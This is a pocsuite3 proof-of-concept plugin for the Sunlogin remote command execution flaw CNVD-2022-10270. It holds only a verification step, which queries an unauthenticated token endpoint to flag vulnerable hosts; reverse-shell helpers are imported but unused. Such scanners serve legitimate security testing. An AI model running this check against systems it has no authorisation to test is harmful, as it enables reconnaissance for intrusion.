from lib2to3.pgen2 import token
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, random_str
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class DemoPOC(POCBase):
    vulID = '190'
    name = '向日葵 check 远程命令执行漏洞 CNVD-2022-10270'
    desc = '''向日葵 check 远程命令执行漏洞 CNVD-2022-10270'''
    appPowerLink = '向日葵<12.5命令执行'
    appName = '向日葵'
    appVersion = '向日葵<12.5'
    samples = []
    install_requires = ['']


    def _verify(self):
        result = {}
        target = self.url + "/cgi-bin/rpc?action=verify-haras"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        try:
            r = requests.get(url=target, timeout=5,verify=False)
            if r.status_code == 200 and 'verify_string' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['filename'] = target
        except:
            pass

        return self.parse_output(result)


register_poc(DemoPOC)